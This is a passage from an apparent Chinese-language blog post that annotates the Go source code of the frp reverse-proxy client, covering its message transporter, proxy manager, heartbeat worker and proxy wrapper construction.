class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs go">ctl.msgTransporter = transport.NewMessageTransporter(ctl.msgDispatcher.SendChannel())<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewMessageTransporter</span><span class="hljs-params">(sendCh <span class="hljs-keyword">chan</span> msg.Message)</span></span> MessageTransporter &#123;<br><span class="hljs-keyword">return</span> &amp;transporterImpl&#123;<br>sendCh:   sendCh,<br>registry: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">chan</span> msg.Message),<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">package</span> transport<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;context&quot;</span><br><span class="hljs-string">&quot;reflect&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br><br><span class="hljs-string">&quot;github.com/fatedier/golib/errors&quot;</span><br><br><span class="hljs-string">&quot;github.com/fatedier/frp/pkg/msg&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> MessageTransporter <span class="hljs-keyword">interface</span> &#123;<br>Send(msg.Message) <span class="hljs-type">error</span><br><span class="hljs-comment">// Recv(ctx context.Context, laneKey string, msgType string) (Message, error)</span><br><span class="hljs-comment">// Do will first send msg, then recv msg with the same laneKey and specified msgType.</span><br><span class="hljs-comment">// Do 将首先发送 msg，然后接收具有相同 laneKey 和指定 msgType 的 msg。</span><br>Do(ctx context.Context, req msg.Message, laneKey, recvMsgType <span class="hljs-type">string</span>) (msg.Message, <span class="hljs-type">error</span>)<br><span class="hljs-comment">// Dispatch will dispatch message to related channel registered in Do function by its message type and laneKey.</span><br><span class="hljs-comment">// Dispatch 会根据消息类型和 laneKey 将消息分派到 Do 函数中注册的相关通道。</span><br>Dispatch(m msg.Message, laneKey <span class="hljs-type">string</span>) <span class="hljs-type">bool</span><br><span class="hljs-comment">// Same with Dispatch but with specified message type.</span><br><span class="hljs-comment">// 与Dispatch相同，但指定了消息类型。</span><br>DispatchWithType(m msg.Message, msgType, laneKey <span class="hljs-type">string</span>) <span class="hljs-type">bool</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewMessageTransporter</span><span class="hljs-params">(sendCh <span class="hljs-keyword">chan</span> msg.Message)</span></span> MessageTransporter &#123;<br><span class="hljs-keyword">return</span> &amp;transporterImpl&#123;<br>sendCh:   sendCh,<br>registry: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">chan</span> msg.Message),<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">type</span> transporterImpl <span class="hljs-keyword">struct</span> &#123;<br>sendCh <span class="hljs-keyword">chan</span> msg.Message<br><br><span class="hljs-comment">// First key is message type and second key is lane key.</span><br><span class="hljs-comment">// Dispatch will dispatch message to related channel by its message type</span><br><span class="hljs-comment">// and lane key.</span><br>registry <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">chan</span> msg.Message<br>mu       sync.RWMutex<br>&#125;<br><br><span class="hljs-comment">// 发送消息 =&gt; 把消息发送到 消息调度器的 chan 中</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(impl *transporterImpl)</span></span> Send(m msg.Message) <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">return</span> errors.PanicToError(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>impl.sendCh &lt;- m<br>&#125;)<br>&#125;<br><br><span class="hljs-comment">// 注册消息管道</span><br><span class="hljs-comment">// recvCh 接收响应的 chan</span><br><span class="hljs-comment">// lanekey </span><br><span class="hljs-comment">// msgType 消息类型</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(impl *transporterImpl)</span></span> registerMsgChan(recvCh <span class="hljs-keyword">chan</span> msg.Message, laneKey <span class="hljs-type">string</span>, msgType <span class="hljs-type">string</span>) (unregister <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span>) &#123;<br>impl.mu.Lock()<br><span class="hljs-comment">// 获取指定消息类型的 byLaneKey map[string]chan msg.Message</span><br>byLaneKey, ok := impl.registry[msgType]<br><span class="hljs-keyword">if</span> !ok &#123;<br>byLaneKey = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">chan</span> msg.Message)<br>impl.registry[msgType] = byLaneKey<br>&#125;<br><span class="hljs-comment">// 注册</span><br>byLaneKey[laneKey] = recvCh<br>impl.mu.Unlock()<br><span class="hljs-comment">// 不注册函数 就是删掉掉</span><br>unregister = <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>impl.mu.Lock()<br><span class="hljs-built_in">delete</span>(byLaneKey, laneKey)<br>impl.mu.Unlock()<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-comment">// 将首先发送 msg，然后接收具有相同 laneKey 和指定 msgType 的 msg</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(impl *transporterImpl)</span></span> Do(ctx context.Context, req msg.Message, laneKey, recvMsgType <span class="hljs-type">string</span>) (msg.Message, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-comment">// 响应的管道</span><br>ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> msg.Message, <span class="hljs-number">1</span>)<br><span class="hljs-comment">// 注册</span><br><span class="hljs-keyword">defer</span> <span class="hljs-built_in">close</span>(ch)<br>unregisterFn := impl.registerMsgChan(ch, laneKey, recvMsgType)<br><span class="hljs-keyword">defer</span> unregisterFn()<br><span class="hljs-comment">// 发送请求</span><br><span class="hljs-keyword">if</span> err := impl.Send(req); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-ctx.Done():<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, ctx.Err()<br><span class="hljs-keyword">case</span> resp := &lt;-ch:<br><span class="hljs-keyword">return</span> resp, <span class="hljs-literal">nil</span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 根据消息类型和 laneKey 将消息分派到 Do 函数中注册的相关通道。</span><br><span class="hljs-comment">// 应该是接收的响应处理</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(impl *transporterImpl)</span></span> DispatchWithType(m msg.Message, msgType, laneKey <span class="hljs-type">string</span>) <span class="hljs-type">bool</span> &#123;<br><span class="hljs-comment">// 拿到 Do 注册的管道</span><br><span class="hljs-keyword">var</span> ch <span class="hljs-keyword">chan</span> msg.Message<br>impl.mu.RLock()<br>byLaneKey, ok := impl.registry[msgType]<br><span class="hljs-keyword">if</span> ok &#123;<br>ch = byLaneKey[laneKey]<br>&#125;<br>impl.mu.RUnlock()<br><br><span class="hljs-keyword">if</span> ch == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><span class="hljs-comment">// 把响应放到这个管道中</span><br><span class="hljs-keyword">if</span> err := errors.PanicToError(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>ch &lt;- m<br>&#125;); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(impl *transporterImpl)</span></span> Dispatch(m msg.Message, laneKey <span class="hljs-type">string</span>) <span class="hljs-type">bool</span> &#123;<br>msgType := reflect.TypeOf(m).Elem().Name()<br><span class="hljs-keyword">return</span> impl.DispatchWithType(m, msgType, laneKey)<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="proxy-NewManager"><a href="#proxy-NewManager" class="headerlink" title="proxy.NewManager"></a>proxy.NewManager</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go">ctl.pm = proxy.NewManager(ctl.ctx, sessionCtx.Common, ctl.msgTransporter)<br><br><br><span class="hljs-keyword">type</span> Manager <span class="hljs-keyword">struct</span> &#123;<br>proxies            <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]*Wrapper<br>msgTransporter     transport.MessageTransporter<br>inWorkConnCallback <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(*v1.ProxyBaseConfig, net.Conn, *msg.StartWorkConn)</span></span> <span class="hljs-type">bool</span><br><br>closed <span class="hljs-type">bool</span><br>mu     sync.RWMutex<br><br>clientCfg *v1.ClientCommonConfig<br><br>ctx context.Context<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewManager</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">ctx context.Context,</span></span><br><span class="hljs-params"><span class="hljs-function">clientCfg *v1.ClientCommonConfig,</span></span><br><span class="hljs-params"><span class="hljs-function">msgTransporter transport.MessageTransporter,</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span> *Manager &#123;<br><span class="hljs-keyword">return</span> &amp;Manager&#123;<br>proxies:        <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]*Wrapper),<br>msgTransporter: msgTransporter,<br>closed:         <span class="hljs-literal">false</span>,<br>clientCfg:      clientCfg,<br>ctx:            ctx,<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ctl-Run-proxyCfgs-visitorCfgs"><a href="#ctl-Run-proxyCfgs-visitorCfgs" class="headerlink" title="ctl.Run(proxyCfgs, visitorCfgs)"></a>ctl.Run(proxyCfgs, visitorCfgs)</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctl *Control)</span></span> Run(proxyCfgs []v1.ProxyConfigurer, visitorCfgs []v1.VisitorConfigurer) &#123;<br><span class="hljs-keyword">go</span> ctl.worker()<br><br><span class="hljs-comment">// start all proxies</span><br>ctl.pm.UpdateAll(proxyCfgs)<br><br><span class="hljs-comment">// start all visitors</span><br>ctl.vm.UpdateAll(visitorCfgs)<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="ctl-worker"><a href="#ctl-worker" class="headerlink" title="ctl.worker()"></a>ctl.worker()</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctl *Control)</span></span> worker() &#123;<br><span class="hljs-comment">// 心跳 =&gt; 默认是不开启的</span><br><span class="hljs-keyword">go</span> ctl.heartbeatWorker()<br><span class="hljs-comment">// 启动消息调度器</span><br><span class="hljs-keyword">go</span> ctl.msgDispatcher.Run()<br><br>&lt;-ctl.msgDispatcher.Done()<br><span class="hljs-comment">// 关闭操作</span><br>ctl.closeSession()<br><br>ctl.pm.Close()<br>ctl.vm.Close()<br><span class="hljs-built_in">close</span>(ctl.doneCh)<br>&#125;<br></code></pre></td></tr></table></figure><p>心跳处理：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Ping <span class="hljs-keyword">struct</span> &#123;<br>PrivilegeKey <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;privilege_key,omitempty&quot;`</span><br>Timestamp    <span class="hljs-type">int64</span>  <span class="hljs-string">`json:&quot;timestamp,omitempty&quot;`</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctl *Control)</span></span> heartbeatWorker() &#123;<br>xl := ctl.xl<br><span class="hljs-comment">// 是否配置了心跳 默认是 -1</span><br><span class="hljs-keyword">if</span> ctl.sessionCtx.Common.Transport.HeartbeatInterval &gt; <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Send heartbeat to server.</span><br><span class="hljs-comment">// 发送心跳 Ping </span><br>sendHeartBeat := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> (<span class="hljs-type">bool</span>, <span class="hljs-type">error</span>) &#123;<br>xl.Debugf(<span class="hljs-string">&quot;send heartbeat to server&quot;</span>)<br>pingMsg := &amp;msg.Ping&#123;&#125;<br><span class="hljs-keyword">if</span> err := ctl.sessionCtx.AuthSetter.SetPing(pingMsg); err != <span class="hljs-literal">nil</span> &#123;<br>xl.Warnf(<span class="hljs-string">&quot;error during ping authentication: %v, skip sending ping message&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, err<br>&#125;<br>_ = ctl.msgDispatcher.Send(pingMsg)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-comment">// 重试机制 一直运行</span><br><span class="hljs-keyword">go</span> wait.BackoffUntil(sendHeartBeat,<br>wait.NewFastBackoffManager(wait.FastBackoffOptions&#123;<br>Duration:           time.Duration(ctl.sessionCtx.Common.Transport.HeartbeatInterval) * time.Second,<br>InitDurationIfFail: time.Second,<br>Factor:             <span class="hljs-number">2.0</span>,<br>Jitter:             <span class="hljs-number">0.1</span>,<br>MaxDuration:        time.Duration(ctl.sessionCtx.Common.Transport.HeartbeatInterval) * time.Second,<br>&#125;),<br><span class="hljs-literal">true</span>, ctl.doneCh,<br>)<br>&#125;<br><br><span class="hljs-comment">// Check heartbeat timeout.</span><br><span class="hljs-comment">// 检查心跳超时</span><br><span class="hljs-keyword">if</span> ctl.sessionCtx.Common.Transport.HeartbeatInterval &gt; <span class="hljs-number">0</span> &amp;&amp; ctl.sessionCtx.Common.Transport.HeartbeatTimeout &gt; <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">go</span> wait.Until(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> time.Since(ctl.lastPong.Load().(time.Time)) &gt; time.Duration(ctl.sessionCtx.Common.Transport.HeartbeatTimeout)*time.Second &#123;<br>xl.Warnf(<span class="hljs-string">&quot;heartbeat timeout&quot;</span>)<br>ctl.closeSession()<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;, time.Second, ctl.doneCh)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>启动消息调度器就是这里的<a href="#20241205171341-sdr7m87">消息调度器</a>启动了发送和读取响应的处理。</p><h5 id="ctl-pm-UpdateAll-proxyCfgs"><a href="#ctl-pm-UpdateAll-proxyCfgs" class="headerlink" title="ctl.pm.UpdateAll(proxyCfgs)"></a>ctl.pm.UpdateAll(proxyCfgs)</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pm *Manager)</span></span> UpdateAll(proxyCfgs []v1.ProxyConfigurer) &#123;<br>xl := xlog.FromContextSafe(pm.ctx)<br><span class="hljs-comment">// 把 proxyCfgs 处理为 map</span><br>proxyCfgsMap := lo.KeyBy(proxyCfgs, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c v1.ProxyConfigurer)</span></span> <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> c.GetBaseConfig().Name<br>&#125;)<br>pm.mu.Lock()<br><span class="hljs-keyword">defer</span> pm.mu.Unlock()<br><span class="hljs-comment">// 需要删除的代理名称</span><br>delPxyNames := <span class="hljs-built_in">make</span>([]<span class="hljs-type">string</span>, <span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> name, pxy := <span class="hljs-keyword">range</span> pm.proxies &#123;<br>del := <span class="hljs-literal">false</span><br><span class="hljs-comment">// 这个代理配置文件的配置写的有问题 不正确就从 pm.proxies （ 代理管理器 ）中删掉</span><br>cfg, ok := proxyCfgsMap[name]<br><span class="hljs-keyword">if</span> !ok || !reflect.DeepEqual(pxy.Cfg, cfg) &#123;<br>del = <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-comment">// 删掉</span><br><span class="hljs-keyword">if</span> del &#123;<br>delPxyNames = <span class="hljs-built_in">append</span>(delPxyNames, name)<br><span class="hljs-built_in">delete</span>(pm.proxies, name)<br>pxy.Stop()<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(delPxyNames) &gt; <span class="hljs-number">0</span> &#123;<br>xl.Infof(<span class="hljs-string">&quot;proxy removed: %s&quot;</span>, delPxyNames)<br>&#125;<br><br>addPxyNames := <span class="hljs-built_in">make</span>([]<span class="hljs-type">string</span>, <span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> _, cfg := <span class="hljs-keyword">range</span> proxyCfgs &#123;<br>name := cfg.GetBaseConfig().Name<br><span class="hljs-keyword">if</span> _, ok := pm.proxies[name]; !ok &#123;<br><span class="hljs-comment">// NewWrapper</span><br>pxy := NewWrapper(pm.ctx, cfg, pm.clientCfg, pm.HandleEvent, pm.msgTransporter)<br><span class="hljs-keyword">if</span> pm.inWorkConnCallback != <span class="hljs-literal">nil</span> &#123;<br>pxy.SetInWorkConnCallback(pm.inWorkConnCallback)<br>&#125;<br><span class="hljs-comment">// 注册到代理管理器 pm 中</span><br>pm.proxies[name] = pxy<br>addPxyNames = <span class="hljs-built_in">append</span>(addPxyNames, name)<br><span class="hljs-comment">// 启动代理</span><br>pxy.Start()<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(addPxyNames) &gt; <span class="hljs-number">0</span> &#123;<br>xl.Infof(<span class="hljs-string">&quot;proxy added: %s&quot;</span>, addPxyNames)<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>看一下这个 Wrapper ：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 工作状态</span><br><span class="hljs-keyword">type</span> WorkingStatus <span class="hljs-keyword">struct</span> &#123;<br>Name  <span class="hljs-type">string</span>             <span class="hljs-string">`json:&quot;name&quot;`</span><br>Type  <span class="hljs-type">string</span>             <span class="hljs-string">`json:&quot;type&quot;`</span><br>Phase <span class="hljs-type">string</span>             <span class="hljs-string">`json:&quot;status&quot;`</span><br>Err   <span class="hljs-type">string</span>             <span class="hljs-string">`json:&quot;err&quot;`</span><br>Cfg   v1.ProxyConfigurer <span class="hljs-string">`json:&quot;cfg&quot;`</span><br><br><span class="hljs-comment">// Got from server.</span><br>RemoteAddr <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;remote_addr&quot;`</span><br>&#125;<br><br><br><span class="hljs-keyword">type</span> Wrapper <span class="hljs-keyword">struct</span> &#123;<br>WorkingStatus<br><br><span class="hljs-comment">// underlying proxy</span><br>pxy Proxy<br><br><span class="hljs-comment">// if ProxyConf has healcheck config</span><br><span class="hljs-comment">// monitor will watch if it is alive</span><br>monitor *health.Monitor<br><br><span class="hljs-comment">// event handler</span><br>handler event.Handler<br><br>msgTransporter transport.MessageTransporter<br><br>health           <span class="hljs-type">uint32</span><br>lastSendStartMsg time.Time<br>lastStartErr     time.Time<br>closeCh          <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;<br>healthNotifyCh   <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;<br>mu               sync.RWMutex<br><br>xl  *xlog.Logger<br>ctx context.Context<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewWrapper</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">ctx context.Context,</span></span><br><span class="hljs-params"><span class="hljs-function">cfg v1.ProxyConfigurer,</span></span><br><span class="hljs-params"><span class="hljs-function">clientCfg *v1.ClientCommonConfig,</span></span><br><span class="hljs-params"><span class="hljs-function">eventHandler event.Handler,</span></span><br><span class="hljs-params"><span class="hljs-function">msgTransporter transport.MessageTransporter,</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span> *Wrapper &#123;<br>baseInfo := cfg.GetBaseConfig()<br>xl := xlog.FromContextSafe(ctx).Spawn().AppendPrefix(baseInfo.Name)<br>pw := &amp;Wrapper&#123;<br>WorkingStatus: WorkingStatus&#123;<br>Name:  baseInfo.Name,<br>Type:  baseInfo.Type,<br>Phase: ProxyPhaseNew,<span class="hljs-comment">// 当前状态为新建代理</span><br>Cfg:   cfg,<br>&#125;,<br>closeCh:        <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;),<br>healthNotifyCh: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;),<br>handler:        eventHandler,<br>msgTransporter: msgTransporter,<br>xl:             xl,<br>ctx:            xlog.NewContext(ctx, xl),<br>&#125;<br><br><span class="hljs-keyword">if</span> baseInfo.HealthCheck.Type != <span class="hljs-string">&quot;&quot;</span> &amp;&amp; baseInfo.LocalPort &gt; <span class="hljs-number">0</span> &#123;<br>pw.health = <span class="hljs-number">1</span> <span class="hljs-comment">// means failed</span><br><span class="hljs-comment">// 设置健康监控</span><br>addr := net.JoinHostPort(baseInfo.LocalIP, strconv.Itoa(baseInfo.LocalPort))<br>pw.monitor = health.NewMonitor(pw.ctx, baseInfo.HealthCheck, addr,<br>pw.statusNormalCallback, pw.statusFailedCallback)<br>xl.Tracef(<span class="hljs-string">&quot;enable health check monitor&quot;</span>)<br>&#125;<br><br>pw.pxy = NewProxy(pw.ctx, pw.Cfg, clientCfg, pw.msgTransporter)<br><span class="hljs-keyword">return</span> pw<br>&#125;<br></code></pre></td></tr></table></figure><p>这个代理就是 <a href="#20241206093727-116xc5a">msg.ReqWorkConn</a> 这里：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewProxy</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">ctx context.Context,</span></span><br><span class="hljs-params"><span class="hljs-function">pxyConf v1.ProxyConfigurer,</span></span><br><span class="hljs-params"><span class="hljs-function">clientCfg *v1.ClientCommonConfig,</span></span><br><span class="hljs-params"><span class="hljs-function">msgTransporter transport.MessageTransporter,</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span> (pxy Proxy) &#123;<br><br><span class="hljs-comment">// 限制</span><br><span class="hljs-keyword">var</span> limiter *rate.Limiter<br>limitBytes := pxyConf.GetBaseConfig().Transport.BandwidthLimit.Bytes()<br><span class="hljs-keyword">if</span> limitBytes &gt; <span class="hljs-number">0</span> &amp;&amp; pxyConf.GetBaseConfig().Transport.BandwidthLimitMode == types.BandwidthLimitModeClient &#123;<br>limiter = rate.NewLimiter(rate.Limit(<span class="hljs-type">float64</span>(limitBytes)), <span class="hljs-type">int</span>(limitBytes))<br>&#125;<br><span class="hljs-comment">// 基础代理</span><br>baseProxy := BaseProxy&#123;<br>baseCfg:        pxyConf.GetBaseConfig(),<br>clientCfg:      clientCfg,<br>limiter:        limiter,<br>msgTransporter: msgTransporter,<br>xl:             xlog.FromContextSafe(ctx),<br>ctx:            ctx,<br>&#125;<br><span class="hljs-comment">// 代理处理工厂 就是对这个 baseProxy 做了修复这样子 TCP 就没啥</span><br>factory := proxyFactoryRegistry[reflect.TypeOf(pxyConf)]<br><span class="hljs-keyword">if</span> factory == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">return</span> factory(&amp;baseProxy, pxyConf)<br>&#125;<br></code></pre></td></tr></table></figure><p>然后就是 